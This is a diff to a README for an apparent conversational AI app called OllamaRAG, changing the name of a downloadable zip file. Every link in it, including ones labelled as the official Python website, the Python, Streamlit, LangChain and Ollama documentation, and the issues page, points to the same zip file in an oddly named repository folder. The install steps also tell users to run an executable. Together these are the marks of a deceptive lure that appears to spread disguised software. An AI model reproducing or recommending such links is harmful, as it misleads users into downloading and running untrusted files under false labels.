@@ -1,6 +1,6 @@
 # 🤖 OllamaRAG - Build Your Conversational AI Assistant Easily
 
-[![Download OllamaRAG](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)
+[![Download OllamaRAG](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -22,23 +22,23 @@ To run OllamaRAG effectively, ensure your system meets the following requirement
 - **Storage**: Minimum of 1 GB free disk space for installation.
 - **Python**: Version 3.7 or later installed.
 
-If you need help installing Python, you can visit the [official Python website](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip) for instructions.
+If you need help installing Python, you can visit the [official Python website](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip) for instructions.
 
 ## 📥 Download & Install
 
 To get started with OllamaRAG, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the release files.
-   [Download OllamaRAG](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)
+   [Download OllamaRAG](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
 
-2. **Choose the Correct File**: Look for the latest version. You will see files like "https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip" for Windows or "https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip" for macOS and Linux.
+2. **Choose the Correct File**: Look for the latest version. You will see files like "https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip" for Windows or "https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip" for macOS and Linux.
 
 3. **Download the File**: Click on the file name to begin downloading it to your computer.
 
 4. **Run the Installer**: 
    - For Windows: Double-click on the downloaded `.exe` file and follow the prompts.
-   - For macOS: Open the `https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip` file, and drag the OllamaRAG app to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip` file and run the installer using the terminal.
+   - For macOS: Open the `https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip` file, and drag the OllamaRAG app to your Applications folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip` file and run the installer using the terminal.
 
 5. **Open the Application**: After installation, launch OllamaRAG from your applications or programs menu.
 
@@ -58,10 +58,10 @@ Once you have OllamaRAG running, you can start interacting with your AI assistan
 
 For further assistance and detailed documentation, feel free to check these resources:
 
-- [Python Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)
-- [Streamlit Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)
-- [LangChain Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)
-- [Ollama Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip)
+- [Python Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
+- [LangChain Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
+- [Ollama Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
 
 ## 🤝 Community Support
 
@@ -77,7 +77,7 @@ OllamaRAG is an open-source project. Contributions are welcome. Whether it’s r
 
 ### 📧 Contact
 
-For questions or feedback, feel free to reach out via the repository's [issues page](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/OllamaRAG.zip).
+For questions or feedback, feel free to reach out via the repository's [issues page](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip).
 
 ## 📝 License
 
